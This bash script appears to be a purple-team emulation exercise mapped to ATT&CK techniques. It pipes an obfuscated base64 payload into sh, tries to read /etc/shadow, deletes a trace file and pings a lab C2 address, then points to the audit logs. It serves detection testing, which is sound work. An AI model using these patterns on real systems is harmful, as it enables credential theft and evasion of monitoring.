#!/usr/bin/env bash
# =========================================================================
# Purple Team Automation Script: Atomic Red Team Attack Injection
# 對接手冊: 27.1 Atomic Red Team & 27.2 Caldera
# =========================================================================
set -euo pipefail

LOG_FILE="/tmp/purple_attack_execution.log"
echo "=== [PURPLE TEAM] Starting Attack Emulation $(date) ===" | tee -a "$LOG_FILE"

# 1. T1059.004 - Command and Scripting Interpreter: Unix Shell (Base64 Encoded Exec)
echo "[*] [T1059.004] Executing Obfuscated Base64 Payload..." | tee -a "$LOG_FILE"
echo "ZWNobyAnaHR0cDovLzE3Mi4yOC4wLjEwOjg4ODgvYmVhY29uJyA+IC90bXAvaW5maWx0cmF0aW9uLnR4dA==" | base64 -d | sh

# 2. T1003.008 - OS Credential Dumping: /etc/shadow Access
echo "[*] [T1003.008] Attempting /etc/shadow Credential Read..." | tee -a "$LOG_FILE"
cat /etc/shadow 2>/dev/null || echo "[!] Permission Denied (Audit log generated)" | tee -a "$LOG_FILE"

# 3. T1070.004 - Indicator Removal on Host: File Deletion
echo "[*] [T1070.004] Performing Anti-Forensics Trace Cleanup..." | tee -a "$LOG_FILE"
rm -f /tmp/infiltration.txt

# 4. T1046 - Network Service Scanning
echo "[*] [T1046] Network Discovery against Subnet..." | tee -a "$LOG_FILE"
ping -c 2 172.28.0.10 >/dev/null 2>&1 && echo "Caldera C2 Host Reachable!" | tee -a "$LOG_FILE"

echo "=== [PURPLE TEAM] Attack Emulation Completed. Check Audit Logs: ausearch -k shadow_access ===" | tee -a "$LOG_FILE"
